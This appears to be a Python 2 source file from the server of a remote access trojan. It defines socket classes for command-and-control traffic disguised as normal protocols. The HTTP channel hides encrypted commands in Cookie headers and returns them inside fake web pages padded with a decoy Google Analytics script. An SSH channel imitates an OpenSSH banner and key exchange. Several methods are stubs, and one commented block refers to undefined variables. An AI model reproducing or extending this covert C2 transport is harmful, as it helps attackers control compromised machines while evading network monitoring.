import json
import socket
import random
from rat_server.encryption import Encryption


SSH_HEADER="[C....2....curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group-exchange-sha256,diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1...gecdsa-sha2-nistp256-cert-v01@openssh.com,ecdsa-sha2-nistp384-cert-v01@openssh.com,ecdsa-sha2-nistp521-cert-v01@openssh.com,ssh-ed25519-cert-v01@openssh.com,ssh-rsa-cert-v01@openssh.com,ssh-dss-cert-v01@openssh.com,ssh-rsa-cert-v00@openssh.com,ssh-dss-cert-v00@openssh.com,ecdsa-sha2-nistp256,ecdsa-sha2-nistp384,ecdsa-sha2-nistp521,ssh-ed25519,ssh-rsa,ssh-dss....chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr,aes128-gcm@openssh.com,aes256-gcm@openssh.com,arcfour256,arcfour128,aes128-cbc,3des-cbc,blowfish-cbc,cast128-cbc,aes192-cbc,aes256-cbc,arcfour,rijndael-cbc@lysator.liu.se....chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr,aes128-gcm@openssh.com,aes256-gcm@openssh.com,arcfour256,arcfour128,aes128-cbc,3des-cbc,blowfish-cbc,cast128-cbc,aes192-cbc,aes256-cbc,arcfour,rijndael-cbc@lysator.liu.se....umac-64-etm@openssh.com,umac-128-etm@openssh.com,hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,umac-64@openssh.com,umac-128@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1,hmac-md5-etm@openssh.com,hmac-ripemd160-etm@openssh.com,hmac-sha1-96-etm@openssh.com,hmac-md5-96-etm@openssh.com,hmac-md5,hmac-ripemd160,hmac-ripemd160@openssh.com,hmac-sha1-96,hmac-md5-96....umac-64-etm@openssh.com,umac-128-etm@openssh.com,hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,umac-64@openssh.com,umac-128@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1,hmac-md5-etm@openssh.com,hmac-ripemd160-etm@openssh.com,hmac-sha1-96-etm@openssh.com,hmac-md5-96-etm@openssh.com,hmac-md5,hmac-ripemd160,hmac-ripemd160@openssh.com,hmac-sha1-96,hmac-md5-96"

class _parent:
    def __init__(self):
        self._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._sock.settimeout(5)
        self._enc = Encryption()
        self._conn = None

    def fileno(self):
        return self._sock.fileno()

    def bind(self, addr):
        return self._sock.bind(addr)

    def listen(self, logback=0):
        return self._sock.listen(logback)

    def connect(self, addr):
        return self._sock.connect(addr)

    def getsockname(self):
        try:return self._sock.getsockname()
        except:pass

    def accept(self):
        conn, addr = self._sock.accept()
        self._conn = conn
        return self, addr

    def recv(self, key=None):
        raise NotImplemented

    def send(self, data, key=None):
        raise NotImplemented

    def close(self):
        try:return self._conn.close()
        except:pass

    def __del__(self):
        try:self._sock.close()
        except:pass


class Ftp_Socket(_parent):
    def recv(self, size, key=None):
        raise NotImplemented()

    def send(self, data, key=None):
        raise NotImplemented()


class Ssh_Socket(_parent):
    def recv(self, size, key=None):
        raise NotImplemented()
        '''
        try:
            tmp = conn.recv(4096)
            conn.send("SSH-2.0-OpenSSH_6.9p1-hpn14v5")
            tmp = conn.recv(4096)
            conn.send(SSH_STRING)
            enc_msg = conn.recv(4096)
        except:
            print "[-] Socket timeout"
            return
        key = self.client_pub_key[addr[0]]
        msg = self.enc.decrypt_msg(enc_msg, key)
        return_msg = self._handle_command(msg)
        if return_msg:
            enc_return_msg = self.enc.encrypt_msg(return_msg, key)
            conn.send(enc_return_msg + "\r\n")
        conn.close()
        '''

    def send(self, data, key=None):
        pass

class Http_Socket(_parent):
    def recv(self, size, key=None):
        try:
            content = self._conn.recv(size)
        except:
            print "[-] Socket timeout"
            return -1
        if "Cookie: " in content:
            msg = content.split("Cookie: ")[-1].split("\n")[0]
            if key:
                msg = self._enc.decrypt_msg(msg, key)
            return msg

    def send(self, data, key=None):
        msg = "HTTP/1.1 200 OK\n"
        msg += "Keep-Alive: timeout=5, max=100\n"
        msg += "Connection: Keep-Alive\n"
        msg += "Cache-Control: private, max-age=0\n"
        msg += "Content-Type: text/html; charset=ISO-8859-1\n\n"
        if key:
            data = self._enc.encrypt_msg(data, key)
        msg += "<html>\n<body>\n%s<div>%s\n<footer>\n<script>\n" % (len(data), data)
        msg += "(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']"
        msg += "=r;i[r]=i[r]||function(){(i[r].q=i[r].q||[]).push("
        msg += "arguments)},i[r].l=1*new Date();a=s.createElement(o),"
        msg += "m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m."
        msg += "parentNode.insertBefore(a,m)})(window,document,'script"
        msg += "','//www.google-analytics.com/analytics.js','ga');"
        msg += "ga('create', 'UA-%d-3'" % random.randint(10000000,99999999)
        msg += ", 'auto');ga('send', 'pageview');\n"
        msg += "</script>\n</footer>\n</body>\n</html>\n\n"
        return  self._conn.send(msg)


class Client_Socket(_parent):
    def recv(self, size):
        msg = self._conn.recv(size)
        try:return json.loads(msg)
        except:return None

    def send(self, msg):
        try:msg = json.dumps(msg)
        except:msg=""
        return self._conn.send(msg)
